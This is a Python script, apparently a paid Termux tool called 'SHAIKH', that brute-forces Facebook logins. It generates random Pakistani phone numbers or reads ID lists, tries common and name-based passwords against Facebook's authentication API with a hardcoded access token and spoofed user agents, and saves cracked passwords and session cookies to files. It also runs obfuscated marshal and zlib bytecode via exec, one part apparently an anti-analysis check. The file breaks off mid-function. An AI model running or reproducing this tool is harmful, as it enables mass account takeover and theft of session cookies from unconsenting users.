#SOURCE : BY ZAIN
#GITHUB  : 
#--------------------------------------------------------------------------#

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess, hashlib 
	from string import *
	from io import BytesIO
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SHAIKH_enc.py')
try: import pycurl
except ModuleNotFoundError: os.system('pip install pycurl')
os.system('git pull -q')
try:from fake_useragent import UserAgent
except ModuleNotFoundError:os.system('pip install fake-useragent')
print(' [•] Join Our Group')
os.system('xdg-open https://facebook.com/groups/1774055946212186/')
input(' [•] Press Enter ')
os.system('xdg-open https://chat.whatsapp.com/BLPJy7bcUaDHLgpDowgvuc')

try:
	ah = os.listdir('/sdcard')
	if ['Android'] in ah:pass
except:print(' \n allow storage permission ...!');time.sleep(1);os.system('termux-setup-storage');exit()

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
IPGD ='\33[1;32m'

# modl chks
print(' checking modules...!')
import marshal, zlib
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\xf3\xb0\x02\x00\x00\x97\x00d\x00Z\x00g\x00d\x01\xa2\x01Z\x01d\x02Z\x02d\x03Z\x03d\x04\x84\x00Z\x04e\x05\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\x90\x01]1\\\x03\x00\x00Z\x07Z\x08Z\te\tD\x00\x90\x01]&Z\ne\x05j\x0b\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x07e\n\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z\re\re\x02k\x02\x00\x00\x00\x00s\x06e\re\x03k\x02\x00\x00\x00\x00r\x01\x8c+e\x05j\x0b\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\xe1\x02\x00e\x04e\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\xd6\x02\x00e\x0fd\x05e\x10\x9b\x00d\x06e\x11\x9b\x00d\x07e\x10\x9b\x00e\r\x9b\x00\x9d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x12e\rd\x08d\t\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x13e\x13\xa0\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x15\x02\x00e\x16e\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]y\\\x02\x00\x00Z\x17Z\x18\x02\x00e\x19d\x0b\x84\x00e\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r_\x02\x00e\x0fe\x10\x9b\x00d\x0ce\x11\x9b\x00d\re\x17d\x0ez\x00\x00\x00\x9b\x00d\x0fe\x10\x9b\x00d\x05e\x18\xa0\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x1b\xa0\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x1d\xa0\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x10e\x1f\x9b\x00d\x11e \x9b\x00d\x12\x9d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cz\t\x00d\x13d\x13d\x13\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x90\x01\x8c(\x90\x01\x8c3d\x13S\x00)\x14z\x1f/data/data/com.termux/files/usr)\x03z\x0bprint(data)z\x0eprint(headers)z\nprint(url)zW/data/data/com.termux/files/usr/lib/python3.11/site-packages/Cython/Compiler/Options.pyzG/data/data/com.termux/files/usr/share/nmap/scripts/rmi-dumpregistry.nsec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x03\x00\x00\x00\xf3\x06\x01\x00\x00\x87\x02\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x01d\x02\xac\x03\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x01|\x01\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x02t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x04\x84\x08t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\x0e\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x05S\x00\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00n\x10#\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x03\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x06S\x00)\x07N\xda\x01r\xfa\x05utf-8\xa9\x01\xda\x08encodingc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x003\x00\x00\x00\xf3 \x00\x00\x00\x95\x01K\x00\x01\x00\x97\x00|\x00]\x08}\x01|\x01\x89\x02v\x00V\x00\x97\x01\x01\x00\x8c\td\x00S\x00\xa9\x01N\xa9\x00)\x03\xda\x02.0\xda\x07keyword\xda\x07contents\x03\x00\x00\x00  \x80\xfa\x01 \xfa\t<genexpr>z%check_for_keywords.<locals>.<genexpr>\x0b\x00\x00\x00s(\x00\x00\x00\xf8\xe8\x00\xe8\x00\x80\x00\xd0\t5\xd0\t5\xa0\x17\x88\'\x90W\xd0\n\x1c\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xf3\x00\x00\x00\x00TF)\x05\xda\x04open\xda\x04read\xda\x03any\xda\x08keywords\xda\x12UnicodeDecodeError)\x03\xda\tfile_path\xda\x04filer\x0c\x00\x00\x00s\x03\x00\x00\x00  @r\r\x00\x00\x00\xda\x12check_for_keywordsr\x17\x00\x00\x00\x07\x00\x00\x00s\xf9\x00\x00\x00\xf8\x80\x00\xf0\x02\x06\x02\x07\xdd\x07\x0b\x88I\x90s\xa0W\xd0\x07-\xd1\x07-\xd4\x07-\xf0\x00\x03\x03\x10\xb0\x14\xd8\r\x11\x8fY\x8aY\x89[\x8c[\x807\xdd\x06\t\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xadH\xd0\t5\xd1\t5\xd4\t5\xd1\x065\xd4\x065\xf0\x00\x01\x04\x10\xd8\x0b\x0f\xf0\x07\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf1\x00\x03\x03\x10\xf4\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x04\x01\x04\x10\xf0\x05\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf1\x00\x03\x03\x10\xf4\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf8\xf8\xf8\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf8\xf8\xf5\x08\x00\t\x1b\xf0\x00\x01\x02\x07\xf0\x00\x01\x02\x07\xf0\x00\x01\x02\x07\xd8\x02\x06\x80$\xf0\x03\x01\x02\x07\xf8\xf8\xf8\xe0\x08\r\x88\x05s:\x00\x00\x00\x83\x12A1\x00\x956A%\x03\xc1\x0b\x0bA1\x00\xc1\x19\x0cA1\x00\xc1%\x04A)\x07\xc1)\x03A1\x00\xc1,\x01A)\x07\xc1-\x03A1\x00\xc11\nA>\x03\xc1=\x01A>\x03r\r\x00\x00\x00u\x05\x00\x00\x00[\xe2\x80\xa2]z\x1a Found print keyword in : r\x03\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00#\x00\x00\x00\xf3(\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\r}\x01|\x01t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00v\x00V\x00\x97\x01\x01\x00\x8c\x0ed\x00S\x00r\x08\x00\x00\x00)\x01\xda\x04line)\x02r\n\x00\x00\x00r\x0b\x00\x00\x00s\x02\x00\x00\x00  r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\x1c\x00\x00\x00s&\x00\x00\x00\xe8\x00\xe8\x00\x80\x00\xd0\x0c5\xd0\x0c5\xa0\x17\x88W\x9d\x04\x88_\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5r\x0f\x00\x00\x00u\x07\x00\x00\x00 [\xe2\x80\xa2] z\x12Printing Line No. \xe9\x01\x00\x00\x00z\x02 :\xfa\x01\nu\x06\x00\x00\x00 [\xc3\x97] z\x13Dont Try Bypass...!N)!\xda\tdirectoryr\x13\x00\x00\x00\xda\x0cexclude_file\xda\x0eexclude_file_2r\x17\x00\x00\x00\xda\x02os\xda\x04walk\xda\x04root\xda\x04dirs\xda\x05files\xda\tfile_name\xda\x04path\xda\x04joinr\x15\x00\x00\x00\xda\x06isfile\xda\x05print\xda\x01G\xda\x01Wr\x10\x00\x00\x00r\x16\x00\x00\x00\xda\treadlines\xda\x05lines\xda\tenumerate\xda\x01ir\x19\x00\x00\x00r\x12\x00\x00\x00\xda\x05strip\xda\x04time\xda\x05sleep\xda\x03sys\xda\x04exit\xda\x01R\xda\x01Yr\t\x00\x00\x00r\x0f\x00\x00\x00r\r\x00\x00\x00\xfa\x08<module>r6\x00\x00\x00\x01\x00\x00\x00s(\x02\x00\x00\xf0\x03\x01\x01\x01\xd8\x0c-\x80\t\xd8\x0b:\xd0\x0b:\xd0\x0b:\x80\x08\xe0\x0fh\x80\x0c\xd8\x11Z\x80\x0e\xf0\x04\x08\x01\x0e\xf0\x00\x08\x01\x0e\xf0\x00\x08\x01\x0e\xf0\x14\x00\x1a\x1c\x9f\x17\x9a\x17\xa0\x19\xd1\x19+\xd4\x19+\xf0\x00\x0e\x016\xf1\x00\x0e\x016\xd1\x04\x15\x80D\x88$\x90\x05\xd8\x12\x17\xf0\x00\r\x026\xf1\x00\r\x026\x80Y\xd8\x0e\x10\x8cg\x8fl\x8al\x984\xa0\x19\xd1\x0e+\xd4\x0e+\x80)\xd8\x05\x0e\x90,\xd2\x05\x1e\xd0\x05\x1e\xa0)\xa8~\xd2"=\xd0"=\xd8\x03\x0b\xd8\x05\x07\x84W\x87^\x82^\x90I\xd1\x05\x1e\xd4\x05\x1e\xf0\x00\t\x036\xd8\x06\x18\xd0\x06\x18\x98\x19\xd1\x06#\xd4\x06#\xf0\x00\x08\x046\xd8\x04\t\x80E\xd0\nA\x88a\xd0\nA\xd0\nA\x90a\xd0\nA\xd0\nA\xb01\xd0\nA\xb0i\xd0\nA\xd0\nA\xd1\x04B\xd4\x04B\xd0\x04B\xd8\t\r\x88\x14\x88i\x98\x13\xa0w\xd0\t/\xd1\t/\xd4\t/\xf0\x00\x06\x056\xb04\xd8\r\x11\x8f^\x8a^\xd1\r\x1d\xd4\r\x1d\x80U\xd8\x14\x1d\x90I\x98e\xd1\x14$\xd4\x14$\xf0\x00\x04\x066\xf0\x00\x04\x066\x89\x17\x88\x11\x88D\xd8\t\x0c\x88\x13\xd0\x0c5\xd0\x0c5\xa8H\xd0\x0c5\xd1\x0c5\xd4\x0c5\xd1\t5\xd4\t5\xf0\x00\x03\x076\xd8\x07\x0c\x80u\x90\x01\xd0\rJ\xd0\rJ\x98!\xd0\rJ\xd0\rJ\xa8q\xb01\xa9u\xd0\rJ\xd0\rJ\xb8\x01\xd0\rJ\xd0\rJ\xb8D\xbfJ\xbaJ\xb9L\xbcL\xd0\rJ\xd0\rJ\xd1\x07K\xd4\x07K\xd0\x07K\xd8\x07\x0b\x87z\x82z\x90!\x81}\x84}\x80}\xd8\x07\n\x87x\x82x\xd0\x104\x90Q\xd0\x104\xd0\x104\x98a\xd0\x104\xd0\x104\xd0\x104\xd1\x075\xd4\x075\xd0\x075\xf8\xf0\t\x04\x066\xf0\x05\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf1\x00\x06\x056\xf4\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf8\xf8\xf8\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf9\xf1\x0f\r\x026\xf0\x03\x0e\x016\xf0\x00\x0e\x016s\x13\x00\x00\x00\xc2 B\x1aE\x07\x07\xc5\x07\x04E\x0b\x0b\xc5\x0e\x01E\x0b\x0b'))

# REQUESTS 
exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3B\x00\x00\x00\x97\x00\x02\x00e\x00e\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s4\x01\x00\x00x\x9cu\x90Kk\x83@\x14\x85\xf7\xfd\x15\x97YT\x85\xa9\xeb\x12pau\x9a\x08iLu\xa4\x8bR\x8a\xd5kc\x13\x1d\x19\xc7@\x08\xf9\xef\x9d\xf8\xc8\xa2Mf1\xcc\xe3|\xe7\x1cn\x8e\x05tm\x95\xd6f'w\x14*T\x1b\x91;d\xce8\xa1\x90\xa7*uV\xa2F\n\x1bLs\x94m\x7f\xb3fw\xa0W\x06\x0e4\x87Ls\xb6\xa77\xd3\x1a^\xed\x16\x95h\x949~%\xd1\x92\x82>\\\xffu=\x8f\xad\xf9'[y\xa1\x1f\xac\xe6\x14\x0cc\x10\x96\xc5\xd8e\xc8\xba\xc6zI\xcc\xc3\x97\x88\xbd&,\xe6S\xf5\x0b=\x16\xbe\x8d/8_/\x98\xeb\xb3\x88\xc2{A\x8e\xdb\xd3\x0c\x8e\xfb\x13\x81BH\xd8R\xd8CYO.v\xa9\xb0jM\xeb\xe3O9p\x1c \xeb0\xe6\x04\xd2:\xef\xe7u;\xf0\xac{\x0e\xd8\xd2\x8f)\x90{b\xff\x88\xb26\xfb`\xe7_\xee\xd9i\n\xb5\x86\xd0\xaf\xae(P\xea\x99?\x1d\x14\xb6Axc\xdeoQ\xc0\x99\xefr\x97\x8e\xc4$kP\xea\x84j\xc4$\xb6\x8d\xf6\x1a$\xf67\xaa}\xba\xeb\xd0\xb4\xec\x1c3\x91\xa3it\xaaxx4&8\xdb\x89\x16/\xa8\xead\xdd;\xfc\x02\x1b\xfb\xac\xe0N)\x03\xda\x04exec\xda\x04zlib\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s@\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80T\x87_\x82_\xf0\x00\x00\x16l\r\xf1\x00\x00\x06m\r\xf4\x00\x00\x06m\r\xf1\x00\x00\x01n\r\xf4\x00\x00\x01n\r\xf0\x00\x00\x01n\r\xf0\x00\x00\x01n\r\xf0\x00\x00\x01n\rr\x06\x00\x00\x00"))



sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


def u_a():
    g = "[FBAN/FB4A;FBAV/31.0.0.20.21;FBBV/20748110;FBDM/{density=1.2,width=480,height=800};FBLC/ff_CM;FBCR/Global SIM Card;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J100H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";"+g
    

logo=(f"""\
   ___    _   _  _____  _  _   _  _   _ 
  (  _`\ ( ) ( )(  _  )(_)( ) ( )( ) ( )
\033[96;1m  | (_(_)| |_| || (_) || || |/'/'| |_| |
  \033[96;1m`\__ \ |  _  ||  _  || || , <  |  _  |
\033[97;1m  ( )_) || | | || | | || || |\`\ | | | |
  `\____)(_) (_)(_) (_)(_)(_) (_)(_) (_)   \033[92;1m XD
\033[1;37m----------------------------------------------
 [•] Author     :  ZAIN
 [•] Facebook   :  ZAIN
 [•] Tool       :  PAID
 [•] Version    :  14.6
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def pp():
	try:
			ky = open('/sdcard/Android/.nonmedia.js','r').read()
	except(FileNotFoundError):
			op = uuid.uuid1().hex.upper()
			open('/sdcard/Android/.nonmedia.js','w').write(op)
			pp()
	except(KeyError,OSError,IOError):
			linex()
			os.system('termux-setup-storage')
			print(' [×] allow storage permission ')
			pp()
	if len(ky) > 32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	if len(ky) <32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	else:
			pass
	clear()
	print(' [•] wait checking approval...!')
	try:
			ck = usman('https://github.com/sumon1215/sumo/blob/main/sumo.txt')
			if ky in ck:
				linex()
				print(' [√] your key approved...!')
				time.sleep(2)
				pass
			else:
				linex()
				print(' [×] your key not approved...!')
				time.sleep(2)
				clear()
				print(f' Your Key : {str(ky)} ')
				linex()
				input(' (•) press enter for approval')
				os.system('xdg-open https://wa.me/+923450877570?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*SHAIKH*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
	except requests.exceptions.ConnectionError:
		exit(f' [!] Your Internet Connection Lol...!')
	except Exception as e:sys.exit(e)
def menu():
			pp();clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning \n [3] join whatsap group \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open)
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				clear()
				print(' [1] Method M1 \n [2] Method M2')
				linex()
				mth = input(' Choose : ')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mth =='1':
							crack_submit.submit(api2,ids,names,passlist)
						elif mth =='2':
							crack_submit.submit(api,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python SHAIKH_enc.py')
			elif xd in ['2','02']:
				pak()
			elif xd in ['3','03']:
				os.system('xdg-open https://chat.whatsapp.com/E9qcXs9EcwE7JAXW2l2hR3')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')

def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as zain:
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'khankhan123','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khan1234','pak123','khan1122','khan12']
				zain.submit(rd1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python SHAIKH_enc.py')

def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SHAIKH-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        uaa = UserAgent()
                        data = {
                                'adid': adid,
                                'format': 'json', 
                                'device_id': device_id,
                                'email': ids, 
                                'password': pas, 
                                'generate_analytics_claims': '1', 
                                'credentials_type': 'password', 
                                'source': 'login', 
                                'error_detail_type': 
                                'button_with_disabled', 
                                'enroll_misauth': 'false', 
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1', 
                                'locale': 'fa_AF', 'client_country_code': 'AF',
                                'fb_api_req_friendly_name': 'authenticate'}
                        headers={
                                'User-Agent':uaa.random,
                                'Accept-Encoding': 'gzip, deflate', 
                                'Accept': '*/*', 
                                'Connection': 'keep-alive', 
                                'Authorization':f'OAuth {accessToken}', 
                                'X-FB-Friendly-Name': 'authenticate', 
                                'X-FB-Connection-Type': 'unknown', 
                                'Content-Type': 'application/x-www-form-urlencoded', 
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SHAIKH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAIKH-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[1;31m [SHAIKH-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAIKH-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass

def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SHAIKH-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]"
